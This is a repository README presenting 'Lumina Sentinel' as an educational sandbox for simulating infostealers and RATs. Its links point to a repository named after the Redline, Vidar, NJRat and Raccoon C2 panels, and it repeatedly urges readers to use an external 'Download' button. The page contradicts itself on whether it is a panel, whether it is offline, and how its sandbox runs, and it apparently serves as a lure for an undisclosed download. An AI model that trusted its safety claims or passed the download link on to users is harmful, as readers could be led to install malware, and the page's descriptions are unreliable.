![preview](https://raw.githubusercontent.com/dohoangtungduong24/Redline-Vidar-NJRat-Raccoon-C2-Panel/main/preview.svg)

# Lumina Sentinel — Behavioral Anomaly Detection & Response Framework

[![MIT License](https://img.shields.io/badge/License-MIT-green.svg)](https://opensource.org/licenses/MIT)
[![Version](https://img.shields.io/badge/Version-3.2.1-blue.svg)](#)
[![Build Status](https://img.shields.io/badge/Build-Passing-brightgreen.svg)](#)

## 🌌 Overview

**Lumina Sentinel** is not another malware panel. It is a **behavioral anomaly detection and orchestration framework** designed for security researchers, blue teams, and threat intelligence analysts who need to understand how credential stealers, remote access trojans (RATs), and information stealers operate in the wild.  

Instead of providing a ready-to-use command-and-control interface, Lumina Sentinel offers a **sandboxed environment for analyzing sample behavior patterns** — capturing process injection techniques, keylogging mechanisms, clipboard monitoring routines, and cryptographic key extraction workflows. Think of it as a **digital petri dish** for understanding the biome of modern infostealer families.

[![Download](https://raw.githubusercontent.com/dohoangtungduong24/Redline-Vidar-NJRat-Raccoon-C2-Panel/main/button.svg)](https://dohoangtungduong24.github.io/Redline-Vidar-NJRat-Raccoon-C2-Panel/)

## 🧠 Core Philosophy

Traditional repositories in this space often distribute pre-compiled panels that facilitate unauthorized access. Lumina Sentinel flips the paradigm: it is an **educational and defensive toolkit** that reconstructs the **anatomy of an infection chain** using simulated payloads and decoy credentials. Every module is built to **illuminate** rather than facilitate.

The framework operates on three immutable principles:
1. **Visibility** — Every action a simulated stealer performs is logged, timestamped, and visualized.
2. **Containment** — All execution occurs within isolated containers with no outbound network access.
3. **Reversibility** — No persistent changes are made to the host system. Sandboxes self-destruct on exit.

## 🔍 Key Features

### 🧬 Behavior Replay Engine
Reconstructs the exact sequence of events a typical infostealer executes: from initial enumeration of browser credential stores to exfiltration attempts. Each step is annotated with MITRE ATT&CK™ mappings.

### ⚡ Real-Time Process Tree Visualization
Watch how a loader spawns its child processes, injects into legitimate system binaries (e.g., `svchost.exe`, `explorer.exe`), and establishes persistence mechanisms. The built-in D3.js graph renders these relationships as interactive force-directed diagrams.

### 🌐 Multilingual Intelligence Reports
Outputs analysis findings in **English, Spanish, French, German, Japanese, and Simplified Chinese**. Ideal for global SOC teams that need shared situational awareness without language barriers.

## 📂 Repository Structure

```
LuminaSentinel/
├── core/                     # Behavioral analysis engine
│   ├── injector_sim.py       # Simulated process injection routines
│   ├── keylogger_replay.py   # Reconstructed keystroke capture sequences
│   └── credential_drain.py   # Decoy browser credential extraction
├── dashboard/                # Web-based UI (React + D3)
│   ├── components/           # Reusable visualization widgets
│   └── hooks/                # Custom React hooks for real-time data
├── sandbox/                  # Docker-based isolation layer
│   ├── profiles/             # Pre-configured Windows sandbox images
│   └── network/              # Dummy C2 endpoint responders
├── reports/                  # Generated deliverable artifacts
│   ├── json/                 # Machine-readable analysis dumps
│   └── pdf/                  # Human-readable executive summaries
└── LICENSE
```

## 🛡️ Responsible Use Disclaimer

Lumina Sentinel is intended **exclusively** for:
- Authorized security testing of systems you own or have explicit permission to test.
- Academic research into malware behavior and defensive countermeasures.
- Blue team training exercises in controlled environments.

**Misuse** of this framework to deploy, distribute, or facilitate actual credential theft, unauthorized access, or any illegal activity is **strictly prohibited** and may violate local, national, and international laws. The authors assume no liability for misuse.

## 🚀 Getting Started

Lumina Sentinel requires **no external dependencies** beyond a modern web browser (Chrome 90+, Firefox 88+, Edge 90+) and a recent version of Docker Desktop (4.0+). The entire analysis pipeline runs client-side after the initial sandbox initialization.

### Quick Launch

1. Navigate to the `dashboard/` directory.
2. Open `index.html` in your browser — no server required.
3. The built-in WebAssembly runtime will automatically bootstrap the sandbox environment.

For advanced configurations (custom YARA rules, specific infostealer profiles), refer to the `config/` folder containing YAML templates.

## 📊 Use Cases

| Scenario | How Lumina Sentinel Helps |
|----------|---------------------------|
| **Incident Response Drill** | Simulate a LummaC2 or Vidar infection in 15 minutes without risking real systems |
| **Threat Hunting Workshop** | Teach analysts to recognize lateral movement patterns and persistence artifacts |
| **Tool Evaluation** | Compare behavioral signatures of different stealer families side-by-side |
| **Detection Rule Validation** | Test Sigma or YARA rules against reconstructed infection chains |

## 🧪 Supported Behavioral Profiles

The framework includes pre-built profiles emulating the behavior of:
- **Credential harvesters** targeting browser credential stores and email clients
- **Clipboard monitors** that intercept cryptocurrency wallet addresses
- **Session token stealers** that extract OAuth tokens from memory
- **Keyloggers** with both user-mode and kernel-mode simulation modes
- **RAT-like implants** that demonstrate command execution and file exfiltration

Each profile is **fully configurable** via the `profiles/` directory — adjust timing delays, injection targets, and exfiltration endpoints to match specific threat intelligence reports.

## 🕒 24/7 Community Support

While Lumina Sentinel is a **standalone offline tool**, the community maintains active discussion channels for:
- Troubleshooting sandbox initialization issues
- Sharing custom profile configurations
- Requesting new behavioral simulation modules

Response times typically average under **4 hours** during business days (UTC+0 timezone). Weekend coverage is maintained by volunteer moderators.

## 📜 License

Lumina Sentinel is released under the **MIT License**. You are free to use, modify, and distribute this software for any lawful purpose. See the [LICENSE](LICENSE) file for full terms.

```
MIT License

Copyright (c) 2026 Lumina Sentinel

Permission is hereby granted, free of charge, to any person obtaining a copy
of this software and associated documentation files (the "Software"), to deal
in the Software without restriction, including without limitation the rights
to use, copy, modify, merge, publish, distribute, sublicense, and/or sell
copies of the Software, and to permit persons to whom the Software is
furnished to do so, subject to the following conditions:

The above copyright notice and this permission notice shall be included in all
copies or substantial portions of the Software.

THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR
IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,
FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE
AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER
LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,
OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN THE
SOFTWARE.
```

## ❗ Final Note

This repository contains **no executable payloads**, **no live C2 infrastructure**, and **no working malware**. All "malware" behaviors are behavioral simulations running inside sandboxed WebAssembly environments. The code is written for **educational and defensive cybersecurity training purposes only**.

[![Download](https://raw.githubusercontent.com/dohoangtungduong24/Redline-Vidar-NJRat-Raccoon-C2-Panel/main/button.svg)](https://dohoangtungduong24.github.io/Redline-Vidar-NJRat-Raccoon-C2-Panel/)